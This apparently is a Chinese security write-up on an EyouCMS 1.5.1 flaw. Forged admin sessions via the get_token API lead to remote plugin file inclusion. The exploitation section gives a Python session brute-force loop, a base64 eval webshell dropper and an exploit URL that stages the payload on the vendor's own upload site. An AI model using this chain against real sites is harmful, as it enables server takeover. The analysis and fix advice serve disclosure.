## **0x00 漏洞简介**

赞赞网络科技 EyouCMS（易优CMS）是中国赞赞网络科技公司的一套基于ThinkPHP的开源内容管理系统（CMS）。

Eyoucms v1.5.1
及以前版本存在任意用户后台登陆与文件包含漏洞，该漏洞使攻击者可以通过调用api，在前台设置一个管理员的session，后台远程插件下载文件包含getshell。

##  **0x01 影响版本**

`EyouCMS <= 1.5.1`

##  **0x02 环境搭建**

下载  
官网下载V1.5.1版本  
下载连接：https://qiniu.eyoucms.com/EyouCMS-V1.5.1-UTF8-SP3_142.zip

安装  
通过phpstudy集成环境简单部署  
![image](https://image.3001.net/images/20210420/1618925405_607ed75d9519fa1a6ca67.png!small)

##  **0x03 漏洞分析**

前台设置管理员session在application/api/controller/Ajax.php:215

![image](https://image.3001.net/images/20210420/1618925606_607ed826b375107c6ae6a.png!small)

`get_token`

函数是可以前台随意调用的，另外形参中的

`$name`

变量也是通过http传递进来的。跟进token函数，如下图所示。  
![image](https://image.3001.net/images/20210420/1618925652_607ed85471163dd59a5e1.png!small)高亮处有一个设置session的操作，名字是可控的，而值是请求时间戳md5的值。不可控。  
可以尝试通过这个设置session的操作，构造出一个后台管理员的session。然后我们梳理一下后台管理员的登录逻辑。在application/admin/controller/Base.php:54![image](https://image.3001.net/images/20210420/1618925768_607ed8c8695a5fa8f7d83.png!small)这里涉及到了两个session,一个admin_login_expire，一个admin_id

    
    
    if (session('?admin_id') && getTime() - intval($admin_login_expire) < $web_login_expiretime)

`admin_login_expire`

（该session会做减法的校验，需要满足一定条件）

`admin_id`

（该session有就即可，不会验证其值）  
设置完这两个session后，我们继续看到if条件判断里还有一个

`check_priv`

函数，跟进查看：  
![image](https://image.3001.net/images/20210420/1618925874_607ed9324e2345c75e29e.png!small)

    
    
    if (0 >= intval(session('admin_info.role_id')))

`admin_info.role_id`

(满足小于等于0即可)  
设置完三个session后，就可以进后台了，如图所示：  
![image](https://image.3001.net/images/20210420/1618925925_607ed9657fdb8ee4e7336.png!small)

后台远程插件下载getshell在application/admin/controller/Weapp.php:1235![image](https://image.3001.net/images/20210420/1618926016_607ed9c04cdcfd79a18df.png!small)这里传进来一个$url，然后做一个url解析，需要满足host为eyoucms.com。  
也就是程序限制只能从官网下载插件安装，但是这个校验太简单了，可以绕。  
然后下文就是请求这个下载链接，做解压操作，并包含进来config.php。  
![image](https://image.3001.net/images/20210420/1618926078_607ed9fed9829e3e7adfb.png!small)这后面再做的插件标准判断已经不起作用了。

##  **0x04 漏洞利用**

前台设置一个管理员的session  
首先我们可以先取出成功登陆后的管理员session与未登录的普通用户session做对比  
管理员：  
![image](https://image.3001.net/images/20210420/1618926141_607eda3d5fd012fabb563.png!small)普通用户：  
![image](https://image.3001.net/images/20210420/1618926155_607eda4b4d802ea798b14.png!small)调用get_token函数设置名为admin_login_expire的session  
![image](https://image.3001.net/images/20210420/1618926188_607eda6c8f8f7884d3f06.png!small)再查看该普通用户的session  
![image](https://image.3001.net/images/20210420/1618926216_607eda882d576136f37cd.png!small)已成功设置。  
同样的我们可以把admin_id与admin_info.roke_id添加进去。  
 **但是** 这md5字符串显然不符合漏洞分析中的要求，所以这里通过脚本不断刷新session,直到寻找到合适的md5值

    
    
    while 1 :
        admin_login_expire = api_psot("admin_login_expire")
        num_10 = admin_login_expire[2:12]
        if is_number(num_10):
            print("admin_login_expire=",num_10)
            break
    while 1 :
        role_id = api_psot("admin_info.role_id")
        num_1 = role_id[2:3]
        if num_1 in ["a","b","c","d","e","f"]:
            print("role_id=",num_1)
            break
    admin_id = api_psot("admin_id")
    print("admin_id=",admin_id[2:-1])
    

运行结果：  
![image](https://image.3001.net/images/20210420/1618926307_607edae3ae85172401944.png!small)session:  
![image](https://image.3001.net/images/20210420/1618926330_607edafa3fe199bd1a126.png!small)再经过application/admin/controller/Base.php:58和:106的intval()的转换：  
![image](https://image.3001.net/images/20210420/1618926360_607edb1825aa2625a8eb7.png!small)成功使用该PHPSESSID进入后台：  
![image](https://image.3001.net/images/20210420/1618926381_607edb2d1964781859144.png!small)

后台远程插件下载文件包含getshell  
然后开始制作恶意压缩包，文件目录结构如下：

`weappp\weapp\test\config.php``config.php`

文件内容为写入webshell

    
    
    <?php  file_put_contents("./uploads/allimg/news_2021.php",base64_decode("PD9waHAgcGhwaW5mbygpO0BldmFsKCRfUE9TVFttb3Z4XSk7Pz4="));
    ?>
    

压缩成weappp.zip，修改后缀为jpg  
![image](https://image.3001.net/images/20210420/1618926591_607edbff2d5984b9cdada.png!small)到eyoucms.com官网寻找图片上传点  
比如这个提问模块的问题描述：  
https://www.eyoucms.com/ask/  
![image](https://image.3001.net/images/20210420/1618926670_607edc4eb04ea2f6354ae.png!small)获取到上传的图片地址：  
https://www.eyoucms.com/uploads/allimg/210420/1618908445631562.jpg  
直接在浏览器中请求下载该插件：  
http://192.168.58.180/login.php?m=admin&c=weapp&a=downloadInstall&url=https://www.eyoucms.com/uploads/allimg/210420/1618908445631562.jpg  
![image](https://image.3001.net/images/20210420/1618926748_607edc9c1d8c0cbdd18ce.png!small)此时webshell已成功写入：  
![image](https://image.3001.net/images/20210420/1618926775_607edcb7c7dd5fe618bb1.png!small)访问webshell:  
![image](https://image.3001.net/images/20210420/1618926788_607edcc41f6a90df6e22b.png!small)

##  **0x05 修复建议**

升级EyouCMS至V1.5.2或以后版本。

##  **0x06 参考文章**

https://mp.weixin.qq.com/s/JBzQ9xz7kVOm0Ll3yT-IRQ

